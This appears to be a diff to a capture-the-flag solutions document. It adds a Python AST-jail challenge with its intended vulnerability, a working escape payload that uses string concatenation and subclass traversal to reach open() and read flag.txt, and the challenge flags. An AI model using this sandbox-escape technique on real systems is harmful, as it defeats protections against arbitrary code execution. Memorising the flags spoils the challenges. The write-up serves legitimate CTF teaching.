@@ -14,6 +14,8 @@ This document details the intended vulnerability, reverse-engineering methodolog
 | **4** | **MoviPay Roaming Bypass** | `pwn/protocol` | `31336` | Client XOR key recovery & unbound `START` account | `VTCH{r0am1ng_1d3nt1ty_n0t_r3b0und_t0_s3ss10n}` |
 | **5** | **Stock Engine Race** | `pwn/concurrency` | `31337` | TOCTOU check-then-debit thread race condition | `VTCH{Ch3ck_TH3n_Deb!t_I5_not_4_7ran5@ctiON}` |
 | **6** | **Hanbit Bank UAF** | `pwn/heap` | `31338` | Heap chunk reuse & struct type confusion overlay | `VTCH{Dan6l!n9_MeRgE_r3COrDs_reUs3d_8y_ADM1n_reVIew}` |
+| **7** | **PyJail AST Sandbox** | `misc/pyjail` | `31339` | AST reflection & dunder string concatenation breakout | `VTCH{4st_w4lker_c4nt_st0p_th3_d4rk_dund3rs!!}` |
+
 
 ---
 
@@ -308,7 +310,50 @@ with socket.create_connection((HOST, PORT)) as s:
 
 ---
 
+## 7. PyJail AST Sandbox (`misc/pyjail/1`)
+
+### Challenge Overview
+- **Category**: `misc/pyjail`
+- **Port**: `31339`
+- **Files Provided**: `server.py`, `README.md`
+- **Flag**: `VTCH{4st_w4lker_c4nt_st0p_th3_d4rk_dund3rs!!}`
+
+### Intended Vulnerability
+`server.py` parses user input using Python's `ast` module and enforces a raw string word blacklist (`import`, `open`, `os`, `sys`, `flag`, etc.) along with node checks (`ast.Import`, `ast.ImportFrom`, `ast.Exec`).
+
+**Vulnerability**:
+The blacklist checks literal string matches, but Python AST supports string concatenation (`'o'+'p'+'e'+'n'`, `'f'+'lag.txt'`, `'__sub'+'classes__'`).
+Navigating class inheritance via `type(()).__base__.__subclasses__()` allows extracting module `__globals__` containing `__builtins__['open']` to read `flag.txt`.
+
+### Intended Solve Script
+```python
+import socket, sys
+
+HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
+PORT = 31339
+
+payload = (
+    "subclasses = getattr(getattr(type(()), '__ba'+'se__'), '__sub'+'classes__')(); "
+    "g = [getattr(getattr(c, '__in'+'it__', None), '__glob'+'als__', {}) for c in subclasses if '__glob'+'als__' in dir(getattr(c, '__in'+'it__', None))][0]; "
+    "b = g.get('__builtins__'); "
+    "op = b.get('o'+'p'+'e'+'n') if type(b) == dict else getattr(b, 'o'+'p'+'e'+'n'); "
+    "print(op('f'+'lag.txt').read())"
+)
+
+with socket.create_connection((HOST, PORT), timeout=5) as s:
+    r = s.makefile("r", encoding="utf-8", newline="\n")
+    w = s.makefile("w", encoding="utf-8", newline="\n")
+    r.readline()
+    r.readline()
+    w.write(payload + "\n")
+    w.flush()
+    print(r.readline().strip())
+```
+
+---
+
 ## 🛠️ Automated Master Verification
+
 
 To run all intended solvers automatically against live services:
 
